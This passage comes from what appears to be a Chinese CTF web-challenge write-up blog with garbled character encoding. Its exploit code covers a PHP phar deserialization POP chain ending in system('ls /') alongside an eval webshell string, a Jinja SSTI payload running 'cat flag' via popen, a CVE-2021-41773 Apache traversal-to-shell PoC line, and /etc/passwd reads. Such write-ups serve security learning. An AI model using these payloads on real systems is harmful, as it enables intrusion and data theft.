class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;è¿™ä¸åˆç†&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//æ­¤åŠŸèƒ½åºŸå¼ƒï¼Œä¸æƒ³å†™äº†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filter</span>();</span><br><span class="line">        <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;eval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ é“¾å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="keyword">new</span> <span class="title function_ invoke__">xx</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//æ­¤åŠŸèƒ½åºŸå¼ƒï¼Œä¸æƒ³å†™äº†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$z</span>=<span class="keyword">new</span> <span class="title function_ invoke__">zz</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ff</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$z</span>;</span><br><span class="line"><span class="variable">$z</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//å¼€å§‹å†™æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//å†™å…¥stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//å†™å…¥meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa::__destruct() -&gt; zz::__toString() -&gt; zz::write() -&gt; ff:__get() -&gt; xx::__call()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205105221482.png" alt="image-20241205105221482"></p><h2 id="HNCTF-2022-WEEK3-ssssti"><a href="#HNCTF-2022-WEEK3-ssssti" class="headerlink" title="[HNCTF 2022 WEEK3]ssssti"></a>[HNCTF 2022 WEEK3]ssssti</h2><p>è¿™é‡Œç›´æ¥ç»™å‡ºpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat flag</span><br></pre></td></tr></table></figure><h2 id="GFCTF-2021-Baby-Web"><a href="#GFCTF-2021-Baby-Web" class="headerlink" title="[GFCTF 2021]Baby_Web"></a>[GFCTF 2021]Baby_Web</h2><p>æ‰“å¼€åæ²¡ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œæºç ä¸­è¯´äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--æºç è—åœ¨ä¸Šå±‚ç›®å½•xxx.php.txté‡Œé¢ï¼Œä½†ä½ æ€ä¹ˆæ‰èƒ½çœ‹åˆ°å®ƒå‘¢?--&gt;</span><br></pre></td></tr></table></figure><p>åˆè¯•äº†è¯•ç›®å½•ç©¿è¶Šï¼Œä¸è¡Œå•Šã€‚</p><p>æ‰«æ‰«ç›®å½•çœ‹çœ‹</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184800886.png" alt="image-20241205184800886" style="zoom:80%;" /><p>ä¸­é—´æœ‰ä¸€ä¸ª&#x2F;etc&#x2F;passwdçš„ç¥å¥‡ä¸œè¥¿ï¼Œè¯•è¯•</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184816327.png" alt="image-20241205184816327" style="zoom: 67%;" /><p>æˆ‘å‹’ä¸ªä»»æ„æ–‡ä»¶è¯»å–</p><p>æ­¤å¤„å…¶å®æ˜¯ä¸€ä¸ªCVE-2021-41773</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&#x27; -d &#x27;A=|echo;id&#x27;</span><br></pre></td></tr></table></figure><p>pocæ‰§è¡Œä¸äº†ï¼Œæ²¡åŠæ³•ï¼Œæ­£å¸¸æ‰“å§</p><p>è¯»å–ä¸€ä¸‹ä¸Šå±‚ç›®å½•çš„index.php.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Temp</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205185132883.png" alt="image-20241205185132883"></p><p>ä¸è®©æˆ‘è¯»ï¼Ÿï¼Ÿï¼ï¼</p><p>ä¸ºå•¥å•Šï¼Œè¯•è¯•ä¹‹å‰çš„.txtæ ¼å¼ï¼Œå¯ä»¥äº†ï¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">Class Temp&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);<span class="comment">//action=list module=$mod</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; </span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                